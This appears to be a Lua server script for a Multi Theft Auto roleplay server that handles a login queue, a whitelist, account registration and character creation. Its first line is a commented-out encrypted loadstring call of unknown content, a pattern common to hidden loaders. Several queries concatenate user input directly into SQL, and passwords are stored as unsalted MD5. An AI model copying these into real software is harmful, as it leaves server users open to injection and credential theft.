--pcall(loadstring(base64Decode(teaDecode( "+d5MCqURlYMxDPOmKBsah3ytp15FTYvc7bTUJ9C8V/a4EITuih4wEWMg95mrdPUqwXCo0eLPLd/R7hnuSkBwyIu0Wn5o8hGWCC2k4Id1E/iR8cxnraTQak6MvE+GvaeTW0jUVj3OPgoRcwyoMuNzTneKSzoLSU4KgniyJ2ZEiTMagfqfCKfXX59FCczORHvAPxROYzIjaJoxDCnjYAIF385BYIp3cG6UxQHWlS8CLMBR6XfDO31xuMXujGpPM1Qxvevw5GcshxVwC14v190J+CCiXzLPutF+BSyiCTQ/6LuOpNim9+5ppSzkfy9IG66w1lfwG1EL6oO8V74ZAStf1ZB9IHrWzb75wRaiJ/4OpvlR6Kzr23CkIoq7/i25icPtMMnJzdo3lyGMdMMO0fg554SW9J3iDEmbLFdGfTd2CZW4IQ+WxjflctmyiXOu6VtZfihyavVpdl09ew694tVFQMHfgvMFA3Qm","lssdf[????sdf")))) --MYSQL lag ellen valami geci

local connection = exports["bgo_mysql"]:getConnection()

Async:setPriority("high")
Async:setDebug(false)

local serials = {
    ["DF749DAC120194E1221E619D133288F4"]=true,
	["D1C72A4976E2B72C9F00B381BC000052"]=true,
	["5B36547F726E4BED8D22C3703C7EEFE4"]=true,
	["4990CE3DE114CFF02BEE6FB6CE54D4A3"]=true,
	["29DB562F61352D19A0CCD4885B9DED43"]=true,
}

local timer = {}

local Whitelist = { 
    ["DF749DAC120194E1221E619D133288F4"]=true, --abinis
	["D1C72A4976E2B72C9F00B381BC000052"]=true, --JOHNNY
	["5B36547F726E4BED8D22C3703C7EEFE4"]=true, --JOHNNY/ELIAS
	["4990CE3DE114CFF02BEE6FB6CE54D4A3"]=true, --TONHAO DA SILVA!
	["4B9CC62F63FEB3CF0988BABA9A4CD744"]=true, --LIPINHO
	["3A55A2339B8212AED08E6172B8A527A3"]=true, --CrohsGM
	["52F3EF9012696BDDF80D8FC5DC5BF5B3"]=true, --RUUD
	["29DB562F61352D19A0CCD4885B9DED43"]=true, --JohnnyNOOT
	["47AED752073A8FC35AE98D9A74435BA2"]=true, --MORAIS MTA
	["B2C126B97FE4080EB998C55A5134C744"]=true, --IMPERADOR
	["547D1937106200EA69F726C8F5F384E4"]=true, --GREEN
	["D101299A50A611AC90E275B928E8F391"]=true, --JUNIOR
	["326D0D1275FD605C6D2ED13062CB0884"]=true, --CL
	["1019E450330F306803822D23C28B1C53"]=true, --BOBZIN
	["F37E3B9FF4E1457FC41AC43E8E0B56F3"]=true, --GANANCIA
	["EC8E1391875D942840774D2000C97602"]=true, --GANANCIA2
	["C2C5CDE78A04B39D2963385A734B6DA2"]=true, --KUSH
	["47F0263A64AD5AD13604FDC21D9C1BA2"]=true, --maicon
	["86C11ABE8D96E42341FA437BC7801492"]=true, --Magrin
	["81C485138B43E2C75D27EF7500A72642"]=true, --ANGEL
	
	
	--STREAMERS
	["4B9CC62F63FEB3CF0988BABA9A4CD744"]=true, --	LIPINHO
	["3A55A2339B8212AED08E6172B8A527A3"]=true, --	CrohsGM
	["52F3EF9012696BDDF80D8FC5DC5BF5B3"]=true, --	RUUD MTA
	["46B46D198C95471CA9DE87180ED062F4"]=true, --	MORAIS MTA
	["F07D405DD62F8ACDC2E5859D56107CA3"]=true, --	zoio
	["E672055C01AB812B5484416A1F80CE42"]=true, --	baiano
	["E53674AAAC2B1D0619D4C80FA77D53F2"]=true, --	PANDOX
	["EDE5659E2619A6CFB5EB3492F4F196B2"]=true, --	EDU_BROTHERS
	["365774517B279F8A8AC20CA57A2D11A1"]=true, --	SRPAULO
	["D6BA0AA974AA50C95810743E807DFDA4"]=true, --	PEDRAO
	["F5FB7A12D32534796C8889DD63C39D12"]=true, --   THORQUE
	["6C6585972CF9A843D1CD8DDAA0C127B3"]=true, --   MOTOCA
	["E92597C4232B297C8B8C14F8DD286FF3"]=true, --   RINEZIN
	["357443CD11A37C79FA6DA7A47B843C62"]=true, --   GUIZIN
	["D6E7988C57185A69A54B497744FAB783"]=true, --   PITBUL
	["0F13CFD7C59F365338826014A019AB42"]=true, --   BELLO
	["411FA240EC09824F431E943F15BF52E3"]=true, --   TIRINGA
	["7869609F5045B387A0CF8D507C4B3642"]=true, --   ALEX MTA

} 

local tabela = {}
function proximodafila()		
			for i, v in ipairs ( tabela ) do 
			table.remove( tabela, i )
			if getElementType(v) == "player" then
			onEntrou(v)
			outputDebugString("Aviso: " .. getPlayerName(v) .. " acaba de sair da fila de espera!", 0,  255, 0, 251)
			end
			break
			end
			
--[[
			local tab = nil
			for i = 1, #getElementsByType("player")do
			tab = getElementsByType("player")[i]
			if isElement(tab) and getElementData(tab, "loggedin") == false then
			for i, v in ipairs ( tabela ) do 
			if v == tab then
			triggerClientEvent(tab, "login:QuantidadeFila2", tab, tonumber(i)) 
			end
			end
		end
	end
	]]--
	
end
addEvent("proximodafila", true)
addEventHandler("proximodafila", resourceRoot, proximodafila)
setTimer(proximodafila,5000,0)



addCommandHandler('filae',
	function(thePlayer, commandName)
		local value = getElementData(thePlayer,"char:adminduty")
		if value == 0 and not (tonumber(getElementData(thePlayer, "acc:admin") or 0) >= 7)  then outputChatBox("#7cc576Voc? n?o est? no modo admin!!",thePlayer, 255, 194, 14, true) return end
		if getElementData(thePlayer, "acc:admin") >= 1 then
		fila = 0
		for i, v in ipairs ( tabela ) do 
		fila = tonumber(i)
		end
		outputChatBox ("Atualmente tem "..tonumber(fila).." na fila de espera! ", thePlayer, 255, 0, 0, true )
	end
end
)


function prioridade(player)

			if Whitelist[getPlayerSerial(player)] then
			onEntrou(player)
			--outputDebugString ( "Aviso: " .. getPlayerName ( player ) .. " acaba de sair da fila de espera (PRIORIDADE)!" )
			outputDebugString(getPlayerName ( player ) .. " acaba de sair da fila de espera (PRIORIDADE)!", 0, 255, 255, 255)

			else
			
			if not getElementData(player, "EntrouNaFilaDeEspera2") then
			table.insert ( tabela, player ) 
			for i, v in ipairs ( tabela ) do 
			if v == player then
			triggerClientEvent(player, "login:setPlayerPanelState", player, "espera") 
			triggerClientEvent(player, "login:QuantidadeFila2", player, tonumber(i))
			quantidade = tonumber(i)
			end
			end
			setElementData(player, "EntrouNaFilaDeEspera2", true)

			outputDebugString(getPlayerName(player).." Entrou na fila "..quantidade.."!", 0,  255, 255, 255)
			end
		end
end
addEvent("prioridade", true)
addEventHandler("prioridade", root, prioridade)


function table.removeValue(tab, val)
if not getElementData(val, "loggedin") then
    for index, value in ipairs(tab) do
        if value == val then
            table.remove(tab, index)
			outputDebugString(getPlayerName(val).." Removido da fila de espera porque quitou!", 0, 25, 181, 254)
            return index
        end
    end
    return false
end
end


function removePlayerFromTable ()
   table.removeValue( tabela, source )
end
addEventHandler("onPlayerQuit",root, removePlayerFromTable)

function onEntrou(player)
	if getElementData(player, "loggedin") == false then
	local serial = getPlayerSerial(player)
    dbQuery(
        function(query)
            local query, query_lines = dbPoll(query, -1)
            if query_lines > 0 then
                Async:foreach(query, 
                    function(row)
					
				triggerClientEvent(player, "login:setPlayerPanelState", player, "login")
				--outputDebugString(getPlayerName ( player ) .. " est? logando no servidor", 0, 255, 255, 255)
                    end
                )
				else
				triggerClientEvent(player, "login:setPlayerPanelState", player, "register")
				
				--outputDebugString(getPlayerName ( player ) .. " est? registrando no servidor", 0, 255, 255, 255)
            end
        end, 
    connection, "SELECT * FROM accounts WHERE mtaserial = ? ", serial)
end
end
--addEvent("prioridade", true)
--addEventHandler("prioridade", root, onEntrou)

	

local timerLogin = {}
function onLoginClick(player, password)	
	--if getElementData(player, "loggedin") then return end
	--[[
	if not Whitelist[getPlayerSerial(player)] then
	if isTimer(evitar) then
	exports.bgo_infobox:addNotification(player,"Estamos com uma quantidade grande de gente tentando logar, tenha paci?ncia","error")
	return
	end
	evitar = setTimer(function() end, 10000, 1)
	end
	]]--
	
	
	local password2 = md5(tostring(password))
    dbQuery(
        function(query)
            local query, query_lines = dbPoll(query, -1)
            if query_lines > 0 then
                Async:foreach(query, 
                    function(row)
				--print(getPlayerName(player).." Acaba de logar na cidade")
				local accId = tonumber(row["id"])
				setElementData(player, "acc:id", accId)
				setElementData(player, "acc:name", tostring(row["username"]))
				setElementData(player, "acc:admin", tonumber(row["admin"]) or 0)
				setElementData(player, "acc:aseged", tonumber(row["aseged"]) or 0)
				setElementData(player, "acc:lastlogin", row["lastlogin"])
				local charId2 = getElementData(player, "acc:id")
				dbExec(connection, "UPDATE accounts SET mtaserial = ? WHERE id = ?", getPlayerSerial(player), charId2)
				dbExec(connection, "UPDATE accounts SET online = '1' WHERE id = ?", charId2)
				exports.bgo_infobox:addNotification(player,"Login bem sucedido!","success")
				
				checkCharacter(player)
				--setTimer(checkCharacter,5000,1, source)

				local account = getAccount ( tostring(row["username"]),tostring(password) )
				if ( account ~= false ) then
					logIn (player, account, password )	
				else
					addAccount(tostring(row["username"]), tostring(password))
					outputServerLog ( "Servidor: Conta: "..tostring(row["username"]).." criada com sucesso" )
					redirectPlayer(player,"",0)
				end
				
                    end
                )
				else
				exports.bgo_infobox:addNotification(player,"Senha incorreta, tente novamente!","error")
            end
        end, 
    connection, "SELECT * FROM accounts WHERE password = ? AND mtaserial = ? ", password2, getPlayerSerial(player))
	
	--[[
	local loginQuery = dbQuery(connection, "SELECT * FROM accounts WHERE password = ? AND mtaserial = ? ", password2, getPlayerSerial(player))
	local result = dbPoll(loginQuery, -1)
		if (#result > 0) then
		for _, row in ipairs(result) do
				--if row["mtaserial"] == getPlayerSerial(player) then
				local accId = tonumber(row["id"])
				setElementData(player, "acc:id", accId)
				setElementData(player, "acc:name", tostring(row["username"]))
				setElementData(player, "acc:admin", tonumber(row["admin"]) or 0)
				setElementData(player, "acc:aseged", tonumber(row["aseged"]) or 0)
				setElementData(player, "acc:lastlogin", row["lastlogin"])
				local charId2 = getElementData(player, "acc:id")
				dbExec(connection, "UPDATE accounts SET mtaserial = ? WHERE id = ?", getPlayerSerial(player), charId2)
				dbExec(connection, "UPDATE accounts SET online = '1' WHERE id = ?", charId2)
				exports.bgo_infobox:addNotification(player,"Login bem sucedido!","success")
				
				checkCharacter(player)
				--setTimer(checkCharacter,5000,1, source)

				local account = getAccount ( tostring(row["username"]),tostring(password) )
				if ( account ~= false ) then
					logIn (player, account, password )	
				else
					addAccount(tostring(row["username"]), tostring(password))
					outputServerLog ( "Servidor: Conta: "..tostring(row["username"]).." criada com sucesso" )
					redirectPlayer(player,"",0)
				end
				
				break
		end
		
		
		]]--
		
		--else
		--exports.bgo_infobox:addNotification(player,"Senha incorreta, tente novamente!","error")
	--exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[TENTATIVA ERRADA DE LOGIN]: "..getPlayerName(player).." ERROU A SENHA AO LOGAR NA CIDADE`")
		--end
	end
addEvent("onLoginClick", true)
addEventHandler("onLoginClick", root, onLoginClick)



local timer2 = {}
function onRegisterClick(player, username, password2) --, email)
--[[
		local time = getRealTime()
		local hours = time.hour	
		if hours > 18 and hours < 23 then
			 exports.bgo_info:addNotification(player, "[BGO ERROR]: Cria??o de contas dentro do hor?rio das (18 Hrs ?s 22 Hrs) est? bloqueado!","info")
			 exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[HOR?RIO DE REGISTRO]: "..getPlayerName(player).." est? tentando criar uma conta dentro do hor?rio proibido ( "..hours.." horas )`")
			 return
		 end		
]]--
		 
	if isTimer(timer2[player]) then
	exports.bgo_infobox:addNotification(player,"Aguarde 5 segundos para tentar novamente, tenha paci?ncia","error")
	return
	end
	timer2[player] = setTimer(function() end, 5000, 1)

	if isTimer(evitar2) then
	exports.bgo_infobox:addNotification(player,"Estamos com uma quantidade grande de gente tentando registrar, tenha paci?ncia","error")
	exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[TENTATIVA DE REGISTRO]: "..getPlayerName(player).." est? tentando entrar na cidade!`")
	return
	end
	evitar2 = setTimer(function() end, 7000, 1)
	
	

	local password = md5(password2)
	local accountAdded = addAccount(tostring(username),tostring(password2))
	if ( accountAdded ) then
	
	--[[
	local registerQuery = dbPoll(dbQuery(connection, "SELECT * FROM accounts WHERE username LIKE '".. tostring(username) .."' or mtaserial = '".. getPlayerSerial(player) .."'"), -1)
	for _, row in ipairs(registerQuery) do
			if row["username"] == username then
				--exports.bgo_infobox:addNotification(player,"O nome de usu?rio est? ocupado!","error")
				triggerClientEvent(player, "showWarning", resourceRoot, 3, false, "O nome de usu?rio est? ocupado!")
				return
			end
			if row["mtaserial"] == getPlayerSerial(player) and not serials[getPlayerSerial(player)] then
				exports.bgo_infobox:addNotification(player,"Este serial j? est? conectado a uma conta!","error")
				return
			end
		end

]]--

    dbQuery(
        function(query)
            local query, query_lines = dbPoll(query, -1)
            Async:foreach(query, 
                    function(row)
			if row["username"] == username then
				--exports.bgo_infobox:addNotification(player,"O nome de usu?rio est? ocupado!","error")
				triggerClientEvent(player, "showWarning", resourceRoot, 3, false, "O nome de usu?rio est? ocupado!")
				return
			end
			if row["mtaserial"] == getPlayerSerial(player) and not serials[getPlayerSerial(player)] then
				exports.bgo_infobox:addNotification(player,"Este serial j? est? conectado a uma conta!","error")
				return
			end
                    end
                )
        end, 
    connection, "SELECT * FROM accounts WHERE username LIKE '".. tostring(username) .."' or mtaserial = '".. getPlayerSerial(player) .."'")

					
			--local registerInsert = dbQuery( connection, "INSERT INTO accounts SET username = ?, password = ?, mtaserial = ?, ip = ?, regdate = NOW(), lastlogin = NOW()", username, password, getPlayerSerial(player), getPlayerIP(player))
			local registerInsert = dbExec(connection, "INSERT INTO accounts SET username = ?, password = ?, mtaserial = ?, ip = ?, regdate = NOW(), lastlogin = NOW()", username, password, getPlayerSerial(player), getPlayerIP(player))


			if registerInsert then
			--local result, num, insertID = dbPoll(registerInsert, -1)
			--if insertID then
			exports.bgo_infobox:addNotification(player,"Registro bem sucedido! Agora voc? pode entrar!","success")
			--setElementData(player, "acc:id", insertID)
			triggerClientEvent(player, "login:setPlayerPanelState", resourceRoot, "login")
			exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[REGISTRO DE CONTA]: "..getPlayerName(player).." REGISTOU UMA NOVA CONTA NA CIDADE, "..username.."`")
			end

			
		else
		--exports.bgo_infobox:addNotification(player,"Este usuario ja existe!","error")
		triggerClientEvent(player, "showWarning", resourceRoot, 3, false, "Este usuario ja existe!")
		outputChatBox ( "Este usuario ja existe!", player )
		return
	end

end
addEvent("onRegisterClick", true)
addEventHandler("onRegisterClick", root, onRegisterClick)

local timer3 = {}
function onCharCreateClick(player, charName, charDesc, charBirth, charHeight, charGender, charSkin)
	if isTimer(timer3[player]) then
		exports.bgo_infobox:addNotification(player,"Aguarde 5 segundos para tentar novamente!, tenha paci?ncia","error")
		exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[TENTATIVA DE CRIA??O]: "..getPlayerName(player).." Est? tentando criar um personagem`")
		return
	end
	timer3[player] = setTimer(function() end, 5000, 1)
	
	
	local charId = getElementData(player, "acc:id")
    dbQuery(
        function(query)
            local query, query_lines = dbPoll(query, -1)
                Async:foreach(query, 
                    function(row)
				--local charQuery = dbPoll(dbQuery(connection, "SELECT * FROM characters where charname LIKE '".. charName .."' LIMIT 1"), -1)
				--for _, row in ipairs(charQuery) do
					if string.lower(charName) == string.lower(row["charname"]) then
						exports.bgo_infobox:addNotification(player,"O nome de usu?rio est? ocupado!","error")
						return
					end
				--end
                    end
                )
        end, 
    connection, "SELECT * FROM characters where charname LIKE '".. charName .."' LIMIT 1")
	
	
				local x, y, z = 2412.178+math.random(1,10), 2353.074+math.random(1,10), 14.12 
				local pos = toJSON({x, y, z, 0, 0})
				local charInsert = dbExec(connection, "INSERT INTO characters SET id = ?, charname = ?, gender = ?, skin = ?, pos = ?, suly = 80, magassag = ?, eletkor = ?, leiras = ?, account = ?, data = NOW()", charId, charName, charGender, charSkin, pos, charHeight, charBirth, charDesc, getElementData(player, "acc:id"))
				if charInsert then
				exports.bgo_infobox:addNotification(player,"Personagem criado com sucesso!","success")
				exports.bgo_discordlogs:sendDiscordMessage(1, false, "`[CRIA??O DE PERSONAGEM]: "..getPlayerName(player).." Acaba de criar um personagem, "..charName.." `")
				checkCharacter(player)
				end
	
end
addEvent("onCharCreateClick", true)
addEventHandler("onCharCreateClick", root, onCharCreateClick)



function checkCharacter(player)
	local accId = getElementData(player, "acc:id")
    dbQuery(
        function(query)
            local query, query_lines = dbPoll(query, -1)
            if query_lines > 0 then
                Async:foreach(query, 
                    function(cRow)
			charname = tostring(cRow["charname"])
			playedTime = tonumber(cRow["playedTime"])
			money = tonumber(cRow["money"])
			bankmoney = tonumber(cRow["bankmoney"])
			skin = cRow["skin"]
			adminduty = cRow["adminduty"]
			anick = tostring(cRow["anick"])
			pp = cRow["premiumpont"]
			Leiras = cRow["leiras"]
			job = tostring(cRow["job"])
			pos = fromJSON(cRow["pos"])
			level = tonumber(cRow["Level"])
			exp = tonumber(cRow["LevelEXP"])
			setElementData(player, "spawnPos", pos)
			vehSlot = cRow["carSlot"]
			houseSlot = cRow["houseSlot"]
			hp = cRow["hp"]
			armor = cRow["armor"]
			hunger = cRow["hunger"]
			drink = cRow["drink"]
			adutyTime = cRow["adutyTime"]
			dutySkin = cRow["dutySkin"]
			genero = cRow["gender"]
			if genero == "no" then 
			setElementData(player, "char:genero", "mulher")
			end
			if genero == "ferfi" then 
			--else
			setElementData(player, "char:genero", "homem")
			end
			adminjail = tonumber(cRow["adminjail"])
			adminjail_reason = cRow["adminjail_reason"]
			adminjail_idoTelik = tonumber(cRow["adminjail_idoTelik"])
			adminjail_alapIdo = tonumber(cRow["adminjail_alapIdo"])
			adminjail_admin = cRow["adminjail_admin"]
			adminjail_adminSerial = cRow["adminjail_adminSerial"]
			setElementData(player, "adminjail", adminjail)
			setElementData(player, "adminjail:reason", adminjail_reason)
			setElementData(player, "adminjail:ido", adminjail_idoTelik)
			setElementData(player, "idoTelik", adminjail_idoTelik)
			local idoLetelt = adminjail_alapIdo-adminjail_alapIdo
			setElementData(player, "idoLetelt", idoLetelt)
			setElementData(player, "adminjail:admin", adminjail_admin)
			setElementData(player, "adminjail:adminSerial", adminjail_adminSerial)
			setElementData(player, "adminjail:alapIdo", adminjail_alapIdo)
			setElementData(player, "spawnedHp", hp)
			setElementData(player, "spawnedArmor", armor)
			setElementData(player, "spawnedHunger", hunger)
			setElementData(player, "spawnedDrink", drink)
			setElementData(player, "char:name", charname)
			setElementData(player, "char:playedTime", playedTime)
			setElementData(player, "char:money", money)
			setElementData(player, "char:bankmoney", bankmoney)
			setElementData(player, "char:skin", 0)
			setElementData(player, "char:adminduty", 0)
			setElementData(player, "char:anick", anick)
			setElementData(player, "char:pp", pp)
			setElementData(player, "job", job)
			exports.bgo_employment:setPlayerJob(player, job,  job, skin,true)
 			setElementData (player, "Sys:Level",level)
			setElementData (player, "LSys:EXP",exp)
			setElementData(player, "char:leiras", Leiras)
			setElementData(player, "aduty:time", adutyTime)
			setElementData(player, "char:dutySkin", dutySkin)
			setElementData(player, "char:vehSlot", vehSlot)
			setElementData(player, "char:houseSlot", houseSlot)
			setPlayerHudComponentVisible(player, "crosshair", true)
			triggerClientEvent(player, "checkPlayerCharacter", resourceRoot, "charSpawn")
			setElementData(player, "char:id", accId)
			setElementData(player, "playerid", accId)
                    end
                )
				else
		triggerClientEvent(player, "checkPlayerCharacter", resourceRoot, "charCreate")
            end
        end, 
    connection, "SELECT * FROM characters WHERE id = ?", accId)
end
addEvent("checkCharacter", true)
addEventHandler("checkCharacter", root, checkCharacter)	


--[[
function checkAdminjail(player)
	if getElementData(player, "adminjail") == 1 then
		local idoTelikTimer = setTimer(idoTelikLe, 60000, getElementData(player, "idoTelik"), player)
		local theTimer = setElementData(player, "adminjail:theTimerAccounts", idoTelikTimer)
		outputChatBox("#dc143c[Cadeia Administrativa]:#ffffffVoc? foi detido depois de entrar. para mais detalhes, use o comando #7cc576/tempo", player, 255, 255, 255, true)
	end
end

function checkPdJail(player)
	if getElementData(player, "jailed") == 1 then
		local idoTelikTimer = setTimer(idoTelikLePd, 60000, getElementData(player, "jailed:idoTelik"), player)
		local theTimer = setElementData(player, "jailed:timerAccounts", idoTelikTimer)
		outputChatBox("#0094ff[pris?o]:#ffffff Voc? foi detido depois de entrar. para mais detalhes, use o comando #7cc576/tempo", player, 255, 255, 255, true)
	end
end


function idoTelikLe(targetPlayer)
	if isElement(targetPlayer) then
		local idoTelik = tonumber(getElementData(targetPlayer, "idoTelik")) or 0
		local idoLetelt = tonumber(getElementData(targetPlayer, "idoLetelt")) or 0
		if (idoTelik) and (idoLetelt) then
			setElementData(targetPlayer, "idoTelik", idoTelik-1)
			setElementData(targetPlayer, "idoLetelt", idoLetelt+1)
			local sql = dbExec(connection, "UPDATE characters SET adminjail_idoTelik = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", idoTelik)
		end
		if (idoTelik) <= 1 then
			outputChatBox("#0094ff[informa??o]: #ffffffSua senten?a expirou.", targetPlayer, 255, 255, 255, true)
			local theTimer = getElementData(targetPlayer, "adminjail:theTimerAccounts")
			if isTimer(theTimer) then
				killTimer(theTimer)
  			end
			setElementData(targetPlayer, "adminjail:theTimerAccounts", false)
			local adminjailed = setElementData(targetPlayer, "adminjail", false)
			local adminjail_reason = setElementData(targetPlayer, "adminjail:reason", false)
			local alapido = setElementData(targetPlayer, "adminjail:ido", false)
			local admin = setElementData(targetPlayer, "adminjail:admin", false)
			local adminSerial = setElementData(targetPlayer, "adminjail:adminSerial", false)

			--sql
			local sql = dbExec(connection, "UPDATE characters SET adminjail = ?, adminjail_reason = ?, adminjail_idoTelik = ?, adminjail_alapIdo = ?, adminjail_admin = ?, adminjail_adminSerial = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", 0, false, false, false, false, false)
			local idoTelikVege = setElementData(targetPlayer, "idoTelik", false)
			local idoLeteltVege = setElementData(targetPlayer, "idoLetelt", false)

			--pos
			setElementPosition(targetPlayer, 1571.6392822266, -1692.9930419922, 13.589937210083)
			setElementInterior(targetPlayer, 0)
			setElementDimension(targetPlayer, 0)
		end
	end
end

function idoTelikLePd(targetPlayer)
	if (isElement(targetPlayer)) then

		local idoTelik = tonumber(getElementData(targetPlayer, "jailed:idoTelik")) or 0
		local idoLetelt = tonumber(getElementData(targetPlayer, "jailed:idoLetelt")) or 0

		if (idoTelik) and (idoLetelt) then
			setElementData(targetPlayer, "jailed:idoTelik", getElementData(targetPlayer, "jailed:idoTelik")-1 or 0)
			setElementData(targetPlayer, "jailed:idoLetelt", getElementData(targetPlayer, "jailed:idoLetelt")+1 or 0)
			--outputChatBox(idoTelik .. " van h?tra | " ..  idoLetelt .. " letelt | " .. getPlayerName(targetPlayer) .. " [ACC]")
			local sql = dbExec(connection, "UPDATE characters SET jailed_idoTelik = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", idoTelik)
		end

		if (idoTelik) <= 1 then

			outputChatBox("#0094ff[castigo]:#ffffff Sua senten?a expirou.", targetPlayer, 255, 255, 255, true)

			--outputAdminMessage(getPlayerName(targetPlayer):gsub("_"," ") .. " adminjailje lej?rt. [CHECK:ACC]") --IDG, elt?vol?that?

			local theTimer = getElementData(targetPlayer, "jailed:timerAccounts")
			if isTimer(theTimer) then
				killTimer(theTimer)
			end

			setElementData(targetPlayer, "jailed:timerAccounts", false)

			local adminjailed = setElementData(targetPlayer, "jailed", false)
			local adminjail_reason = setElementData(targetPlayer, "jailed:reason", false)
			local alapido = setElementData(targetPlayer, "jailed:ido", false)
			local admin = setElementData(targetPlayer, "jailed:player", false)

			--sql
			local sql = dbExec(connection, "UPDATE characters SET jailed = ?, jailed_reason = ?, jailed_idoTelik = ?, jailed_alapIdo = ?, jailed_player = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", 0, false, false, false, false, false)
			local idoTelikVege = setElementData(targetPlayer, "jailed:idoTelik", false)
			local idoLeteltVege = setElementData(targetPlayer, "jailed:idoLetelt", false)

			--pos
			setElementPosition(targetPlayer, 1571.6392822266, -1692.9930419922, 13.589937210083)
			setElementInterior(targetPlayer, 0)
			setElementDimension(targetPlayer, 0)
		end
	end
end
]]--






